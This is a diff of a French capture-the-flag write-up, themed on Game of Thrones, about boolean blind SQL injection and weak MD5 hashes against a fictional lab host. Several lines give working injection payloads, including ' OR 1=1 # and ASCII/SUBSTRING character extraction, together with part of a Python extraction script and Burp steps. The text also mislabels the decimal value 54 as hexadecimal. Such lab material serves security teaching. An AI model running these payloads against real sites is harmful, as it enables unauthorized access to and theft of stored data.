@@ -1,9 +1,3 @@
----
-title: Write-up 6
-next: "/write-ups/wu7"
-prev: "/write-ups/wu5"
----
-
 # 🏰 CTF - Injection SQL Boolean Blind & Hash MD5 Faible
 
 ## 🎯 Objectif
@@ -26,7 +20,7 @@ Bravo ! Tu es dans **Castral-Roc**, dans la salle du mestre où sont stockées d
 ---
 
 ## ⚙️ Environnement
-- **Cible :** `http://lannister.castral-roc.lannisport.south/sql_blind_hash.php`
+- **Cible :** `http://lannister.castral-roc.lannisport.south/entourage_lannister.php`
 - **Base de données :** `lannisport_db`
 - **Données sensibles :** Table `allies`
 - **Wordlist fournie** : Liste des 5000 personnes du château
@@ -36,7 +30,7 @@ Bravo ! Tu es dans **Castral-Roc**, dans la salle du mestre où sont stockées d
 ## 🚀 Étape 1 : Vérifier la vulnérabilité SQL
 Dans le champ **Nom** du formulaire, entre :
 ```sql
-' OR 1=1 --
+' OR 1=1 #
 ```
 ✅ **Si la réponse est `L’utilisateur est un allié`, alors l’injection SQL fonctionne.**
 
@@ -46,7 +40,7 @@ Dans le champ **Nom** du formulaire, entre :
 ## 🔍 Étape 2 : Tester si un espion est infiltré chez les Stark
 Dans le champ **Nom**, entre :
 ```sql
-' OR (SELECT COUNT(*) FROM allies WHERE relation='espion' AND localisation='Winterfell') > 0 --
+' OR (SELECT COUNT(*) FROM allies WHERE relation='espion' AND localisation='Winterfell') > 0 #
 ```
 ✅ **Si la page affiche `L’utilisateur est un allié`, alors un espion est bien présent.**
 
@@ -58,7 +52,7 @@ Nous allons **extraire son hash MD5 caractère par caractère** en utilisant **A
 
 Dans le champ **Nom**, entre :
 ```sql
-' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM allies WHERE relation='espion' AND localisation='Winterfell') = 54 --
+' OR (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM allies WHERE relation='espion' AND localisation='Winterfell') = 54 #
 ```
 ✅ **Si la page affiche `L’utilisateur est un allié`, alors le premier caractère du hash est `54` (hexadécimal).**
 
@@ -72,7 +66,7 @@ Pour éviter une extraction manuelle, utilise ce script **Python** :
 ```python
 import requests
 
-URL = "http://lannister.castral-roc.lannisport.south/sql_blind_hash.php"
+URL = "http://lannister.castral-roc.lannisport.south/entourage_lannister.php"
 TRUE_RESPONSE = "L’utilisateur est un allié"
 MD5_HASH = ""
 
@@ -105,7 +99,7 @@ avec burp :
 BURP : 
 1, ouvrir burp, et le browser intégré avec le proxy, 
 
-2, faire requete sur http://lannister.castral-roc.lannisport.south/sql_blind_hash.php
+2, faire requete sur http://lannister.castral-roc.lannisport.south/entourage_lannister.php
 
 pour trouver qqun, par exemple tyrion
 
